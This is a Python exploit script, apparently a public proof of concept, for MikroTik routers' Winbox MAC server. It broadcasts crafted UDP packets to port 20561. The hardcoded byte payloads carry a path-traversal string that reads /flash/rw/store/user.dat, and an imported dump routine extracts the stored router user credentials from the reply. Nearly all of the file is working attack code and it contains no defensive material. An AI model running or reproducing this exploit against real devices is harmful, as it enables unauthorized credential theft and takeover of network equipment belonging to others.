import threading, socket, struct, time, sys, binascii
from extract_user import dump

# MAC server Winbox exploit by BigNerd95 (and mosajjal)

a = bytearray([0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
     0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
     0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
     0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
     0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
     0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
     0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
     0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
     0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
     0x00, 0x00])

b = bytearray([0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
     0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
     0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
     0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
     0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
     0x00, 0x02, 0x00, 0x00, 0x00])

class MikrotikMACClient():

    START = 0
    DATA  = 1
    ACK   = 2
    END   = 255
    PROTO_VERSION = 1
    CLIENT_TYPE = 0x0F90
    SESSION_ID = 0x1234
    ADDR = ("255.255.255.255", 20561)
    HEADLEN = 22
    VERBOSE = False

    def __init__(self, mac):
        self.session_bytes_sent = 0
        self.session_bytes_recv = 0
        self.source_mac = b"\xff\xff\xff\xff\xff\xff" # put mac of your pc if mikrotik is not responding
        self.dest_mac = mac
        
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.sock.bind(('', 0))

        self.buffer = []
        self.work = True
        self.connected = False
        self.rm = threading.Thread(target=self.__recv_manager__)
        self.rm.start()

        self.__send_init__()
    
    def __recv_manager__(self):
        while self.work:
            data, _ = self.sock.recvfrom(1024*64)
            self.__parse_packet__(data)

    def __buffer_pop__(self):
        while not self.buffer and self.connected:
            time.sleep(0.005)
        return self.buffer.pop(0)
            
    def __parse_packet__(self, data):
        _, packet_type = struct.unpack(">BB", data[:2])
        session_id, _, session_bytes = struct.unpack(">HHI", data[14:self.HEADLEN])

        if packet_type == self.DATA:
            self.__print__("New DATA")
            self.session_bytes_recv += len(data) - self.HEADLEN
            self.__send_ack__()

            self.buffer.append(data[self.HEADLEN:])
            self.connected = True

        elif packet_type == self.ACK:
            self.__print__("New ACK")
            self.connected = True
            self.session_bytes_sent = session_bytes
        elif packet_type == self.END:
            self.__print__("End session")
            self.connected = False
            self.work = False
            self.__send_ack__()
        else:
            self.__print__("Unknown packet")
            self.__print__(data)

        self.__print__("ID:", session_id, "Bytes:", session_bytes)
        
        if len(data) > self.HEADLEN:
            self.__print__("Data:", data[self.HEADLEN:])

        self.__print__()

    def __send_ack__(self):
        self.sock.sendto(self.__build_packet__(self.ACK), self.ADDR)

    def __send_data__(self, data):
        self.sock.sendto(self.__build_packet__(self.DATA, data), self.ADDR)

    def __send_end__(self):
        self.sock.sendto(self.__build_packet__(self.END), self.ADDR)

    def __send_init__(self):
        self.sock.sendto(self.__build_packet__(self.START), self.ADDR)
        while not self.connected:
            time.sleep(0.005)

    def __build_packet__(self, packet_type, data=b""):
        header = struct.pack(">BB",
            self.PROTO_VERSION,
            packet_type
        )
        header += self.source_mac
        header += self.dest_mac
        header += struct.pack(">HHI",
            self.SESSION_ID,
            self.CLIENT_TYPE,
            self.session_bytes_sent if packet_type == self.DATA else self.session_bytes_recv
        )
        return header + data

    def __print__(self, *msg):
        if self.VERBOSE:
            print(*msg)

    def send(self, data):
        self.__send_data__(data)

    def recv(self, minlen=None, contains=None):
        d = self.__buffer_pop__()

        while (minlen and len(d) < minlen) or (contains and contains not in d):
            d = self.__buffer_pop__()

        return d

    def close(self):
        self.work = False
        self.__send_end__()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        mac = binascii.unhexlify(sys.argv[1].replace(':', ''))

        m = MikrotikMACClient(mac)

        m.send(a)
        b[19] = m.recv(minlen=39)[38] # set correct session id

        m.send(b)
        dump(m.recv(contains=b"\x11\x00\x00\x21"))
        
        m.close()
        
    else:
        print("Usage: " + sys.argv[0] + " MAC_ADDRESS")
    
